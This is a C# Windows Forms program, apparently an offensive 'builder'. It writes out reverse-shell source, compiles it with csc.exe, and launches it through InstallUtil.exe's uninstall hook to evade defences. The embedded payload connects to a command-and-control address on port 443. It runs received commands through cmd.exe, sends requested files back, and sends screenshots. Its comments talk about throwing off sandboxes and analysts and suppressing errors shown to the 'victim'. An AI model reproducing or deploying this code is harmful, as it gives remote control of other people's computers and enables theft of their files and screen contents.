using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace buildit
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        string output = "";
        private void button1_Click(object sender, EventArgs e)
        {

            createinstallutiltemplate();
           textBox1.Text =  buildbinary();
           textBox2.Text =  runbinaryusinginst();

        }

        private void createinstallutiltemplate()
        {
            string build = @"using System;
using System.Text;
using System.ComponentModel;
using System.Configuration.Install;
using System.Threading;
using System.Net.Sockets;
using System.Net;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Diagnostics;

namespace InstallUtilTest
{
    public class Program
    {

        public static void Main()
        {
            Console.WriteLine(""Does not have any role here"");
            //Add any behaviour here to throw off sandbox execution/analysts :)

        }
    }

    [RunInstaller(true)]
    public partial class RevShellInsaller : Installer
    {

        public override void Uninstall(System.Collections.IDictionary mySavedState) 
        {
            
                base.Uninstall(mySavedState);
                Console.WriteLine(""The Uninstall method of 'RevShellInsaller' has been called"");
                connectbacktoCandC(); 

         }

        static string getresult(string command) // this function executes command from the remote server and sends back the result as  string (byte array)
        {
            Process p = new Process();
            p.StartInfo.FileName = ""cmd.exe"";
            p.StartInfo.Arguments = ""/c "" + command;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();

            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

            return output;
        }

        private  string getscreen()

        {
            string fname = ""myscreen.png"";
            try

            {

                Bitmap captureBitmap = new Bitmap(1024, 768, PixelFormat.Format32bppArgb);

                //Creating a Rectangle object which will  
                //capture our Current Screen

                Rectangle captureRectangle = Screen.PrimaryScreen.Bounds; // here we are taking only primary screen if you want to use in real time env loop through all screns and take screen shots



                //Creating a New Graphics Object
                Graphics captureGraphics = Graphics.FromImage(captureBitmap);
                //Copying Image from The Screen
                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                //Saving the Image File (I am here Saving it in My E drive).
                captureBitmap.Save(fname, ImageFormat.Png);


            }

            catch (Exception)
            {
                // MessageBox.Show(ex.Message);
            }
            return fname;
        }
        private  void connectbacktoCandC()
        {
            IPAddress ipAddress = IPAddress.Parse(""192.168.20.13""); // ip to connect to remote server
            IPEndPoint remoteEP = new IPEndPoint(ipAddress, 443); //set ur port
            // Create a TCP/IP  socket.    
            Socket sender = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            sender.Connect(remoteEP); // connect to ur remote server

            while (true) // start an infinite loop
            {
                //Console.WriteLine(""Connected to {0}"", sender.RemoteEndPoint.ToString());

                try
                {
                    string data = """";
                    string result;

                    var buffer = new byte[1024];
                    int bytesRead;
                    int lineposition = -1;

                    do
                    {
                        lineposition = Array.IndexOf(buffer, (byte)'\n'); // checks for the position of new line
                        //Console.WriteLine(lineposition);
                        bytesRead = sender.Receive(buffer);
                        data += Encoding.ASCII.GetString(buffer, 0, bytesRead);

                    }
                    while (lineposition >= 0); // this loop is for accepting command from the server . it reads till it find a new line in received buffer
                    Console.WriteLine(""Text received : {0}"", data);


                    if (data.ToLower().StartsWith(""getfile"")) // if the command starts with getfile 
                    {
                        string[] filename = data.Split(new char[] { ' ' });
                        sender.SendFile(filename[1]); // sends the file to the controller 
                        Thread.Sleep(700); // waits for some time before sendig the end of command indication to the server
                        sender.Send(Encoding.ASCII.GetBytes(""EOF"")); // we are sending this to indicate the remote machine that all contents sent , time to save the file
                    }
                    else if (data.ToLower().StartsWith(""bye""))
                    {
                        break; // for terminating the connection by breaking the loop 
                    }
                    else if (data.ToLower().StartsWith(""grabscreen"")) // if command is grabscreen take screen shot and send it to remote server
                    {
                        string sendscreen = getscreen();
                        sender.SendFile(sendscreen);
                        Thread.Sleep(700);
                        sender.Send(Encoding.ASCII.GetBytes(""EOF"")); // everything is like sending a file 
                        //System.IO.File.Delete(sendscreen); // remember to do this when u r going to use it real time
                    }
                    else
                    { // here is the core command execution , instead of sending the shell over tcp , we send only the command's result
                        result = getresult(data);
                        Console.WriteLine(result);
                        byte[] msg = Encoding.ASCII.GetBytes(result + ""EOF"");
                        Console.WriteLine(msg.Length);
                        sender.Send(msg);
                        //sender.Shutdown(SocketShutdown.Both);
                    }


                    // Release the socket.    
                    //

                }
                catch (ArgumentNullException ane) // we throw all exceptions to the main function and supress it there since we dont need to indicate any error to the victim
                {
                    throw ane;
                }
                catch (SocketException se)
                {
                    throw se;
                }
                catch (Exception e)
                {
                    throw e;
                }


            }
            sender.Shutdown(SocketShutdown.Both); // out side the loop , close connection
            sender.Close();
        }
    }
}

";

            File.WriteAllText(@"c:\windows\temp\installutiltest.cs",build);
        }
       

        string  buildbinary() 
        {
            Process p = new Process();
            p.StartInfo.FileName = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
            p.StartInfo.Arguments = @"/out:C:\Windows\temp\goinstut.exe c:\windows\temp\installutiltest.cs /r:System.Configuration.Install.dll";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();

            string output = p.StandardOutput.ReadToEnd();
           // p.WaitForExit();
            return output;

        }
        string runbinaryusinginst()
        {
            string installutilpath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe";

            Process p = new Process();
            p.StartInfo.FileName = installutilpath;
            p.StartInfo.Arguments = @"/LogToConsole=false /U C:\Windows\temp\goinstut.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.CreateNoWindow = true;

            p.Start();

            string output = p.StandardOutput.ReadToEnd();

           // p.WaitForExit();
            return output;

        }
    }
}
